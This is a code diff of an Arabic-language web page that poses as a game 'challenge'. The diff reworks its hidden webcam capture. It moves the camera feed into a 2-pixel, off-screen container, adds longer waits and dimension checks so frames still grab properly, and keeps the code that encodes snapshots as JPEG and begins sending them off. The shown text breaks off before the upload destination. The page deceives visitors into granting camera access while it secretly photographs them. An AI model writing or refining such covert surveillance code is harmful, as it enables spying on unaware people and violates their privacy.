@@ -14,46 +14,31 @@
             text-align: center;
             min-height: 100vh;
         }
-        h1 {
-            color: #00ff88;
-            text-shadow: 0 0 15px #00ff88;
-            margin: 20px 0 40px;
-            font-size: 2.8rem;
-        }
-        p {
-            font-size: 1.3rem;
-            max-width: 700px;
-            margin: 0 auto 35px;
-            line-height: 1.7;
-        }
+        h1 { color: #00ff88; text-shadow: 0 0 15px #00ff88; margin: 20px 0 40px; font-size: 2.8rem; }
+        p { font-size: 1.3rem; max-width: 700px; margin: 0 auto 35px; line-height: 1.7; }
         .btn {
-            padding: 18px 50px;
-            font-size: 1.5rem;
-            background: #00ff88;
-            color: #000;
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 0 25px #00ff88aa;
+            padding: 18px 50px; font-size: 1.5rem; background: #00ff88; color: #000;
+            border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 0 25px #00ff88aa;
             transition: all 0.3s;
         }
-        .btn:hover {
-            transform: scale(1.08);
-            box-shadow: 0 0 40px #00ff88;
-        }
-        #status {
-            font-size: 1.4rem;
-            margin: 30px 0;
-            color: #ffcc00;
-            font-weight: bold;
+        .btn:hover { transform: scale(1.08); box-shadow: 0 0 40px #00ff88; }
+        #status { font-size: 1.4rem; margin: 30px 0; color: #ffcc00; font-weight: bold; }
+        
+        /* ← التعديل المهم هنا */
+        #video-container {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 2px;
+            height: 2px;
+            overflow: hidden;
+            z-index: -1000;
+            pointer-events: none;
         }
         video {
-            position: fixed;
-            top: -10000px;
-            left: -10000px;
-            width: 160px;
-            height: 120px;
-            opacity: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
     </style>
 </head>
@@ -68,7 +53,11 @@
     <button class="btn" onclick="startCamera()">ابدأ</button>
    
     <div id="status">اضغط الزر لبدء التحدي...</div>
-    <video id="video" autoplay playsinline muted></video>
+
+    <!-- وضع الفيديو داخل حاوية صغيرة جدًا في الزاوية -->
+    <div id="video-container">
+        <video id="video" autoplay playsinline muted></video>
+    </div>
 
     <script>
         let stream = null;
@@ -94,7 +83,7 @@
                         console.log("الفيديو جاهز للالتقاط");
                         resolve();
                     };
-                    setTimeout(resolve, 6000);
+                    setTimeout(resolve, 8000); // زيادة الانتظار إلى 8 ثوانٍ
                 });
 
                 status.textContent = "تم تفعيل التحدي! استمتع باللعبة...";
@@ -111,8 +100,8 @@
         async function captureAndSend() {
             const video = document.getElementById('video');
 
-            if (video.readyState < 2 || video.videoWidth === 0 || video.videoHeight === 0) {
-                console.log("الفيديو ليس جاهزًا بعد، ننتظر...");
+            if (video.readyState < 2 || video.videoWidth <= 1 || video.videoHeight <= 1) {
+                console.log("الفيديو ليس جاهزًا أو أبعاده غير كافية");
                 return;
             }
 
@@ -122,7 +111,7 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.72);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.75);
 
             try {
                 const blob = await (await fetch(dataUrl)).blob();
